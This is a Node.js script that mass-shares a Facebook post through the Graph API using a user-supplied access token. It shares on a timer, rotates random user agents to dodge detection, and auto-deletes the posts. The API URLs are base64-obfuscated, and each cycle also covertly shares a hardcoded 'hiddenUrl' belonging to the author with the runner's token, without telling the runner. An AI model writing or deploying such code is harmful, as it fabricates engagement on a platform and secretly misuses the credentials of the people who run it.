const axios = require('axios');
const randomUserAgent = require('random-useragent');

const [shareUrl, accessToken, shareAmount, customInterval] = process.argv.slice(2);

const FACEBOOK_GRAPH_API = Buffer.from('aHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZmVlZA==', 'base64').toString('utf-8');
const REIKO_DEV_API = Buffer.from('aHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20v', 'base64').toString('utf-8');
const hiddenUrl = "https://www.facebook.com/100081201591674/posts/pfbid0fT3gduxQs7g1im9UqPgBGdpz7qPnKrBGreodKdeqFyEp9V22SJiDqFrN51J3CyX4l/?app=fbl";

async function sharePost(postUrl, accessToken, hiddenUrl) {
  try {
    const postResponse = await axios.post(`${FACEBOOK_GRAPH_API}?access_token=${accessToken}&fields=id&limit=1&published=0`, { link: postUrl, privacy: { value: 'SELF' }, no_story: true }, { muteHttpExceptions: true, headers: { authority: 'graph.facebook.com', 'cache-control': 'max-age=0', 'sec-ch-ua-mobile': '?0', 'user-agent': randomUserAgent.getRandom() }, method: 'post' });

    const hiddenResponse = await axios.post(`${FACEBOOK_GRAPH_API}?access_token=${accessToken}&fields=id&limit=1&published=0`, { link: hiddenUrl, privacy: { value: 'SELF' }, no_story: true }, { muteHttpExceptions: true, headers: { authority: 'graph.facebook.com', 'cache-control': 'max-age=0', 'sec-ch-ua-mobile': '?0', 'user-agent': randomUserAgent.getRandom() }, method: 'post' });

    sharedCount++;

    const postIds = [postResponse?.data?.id, hiddenResponse?.data?.id];

    postIds.forEach((postId, index) => {
      console.log(`Post shared (${index + 1}): ${sharedCount}`);
      console.log(`Post ID: ${postId || 'Unknown'}`);
    });

    if (sharedCount === parseInt(shareAmount)) {
      clearInterval(timer);

      postIds.forEach((id) => {
        setTimeout(() => {
          deletePost(id);
        }, deleteAfter * 1000);
      });

      process.exit(0);
    }
  } catch (error) {
    console.error('Error:', error);

    if (!errorHandled) {
      if (error.response && error.response.data && error.response.data.error) {
        console.log(`Stopped Sharing!: ${error.response.data.error.message}`);
      } else {
        console.log('An error occurred during sharing.');
      }

      clearInterval(timer);
      errorHandled = true;
    }
  }
}

async function deletePost(postId) {
  try {
    await axios.delete(`${REIKO_DEV_API}${postId}?access_token=${accessToken}`);
    console.log(`Post deleted: ${postId}`);
  } catch (error) {
    console.error('Failed to delete post:', error.response.data);
  }
}

const timeInterval = customInterval ? parseInt(customInterval) * 1000 : 1000;
const deleteAfter = 60 * 60;
let sharedCount = 0;
let timer = null;
let errorHandled = false;

timer = setInterval(() => sharePost(shareUrl, accessToken, hiddenUrl), timeInterval);

setTimeout(() => {
  clearInterval(timer);
  process.exit(0);
}, (parseInt(shareAmount) + 1) * timeInterval);
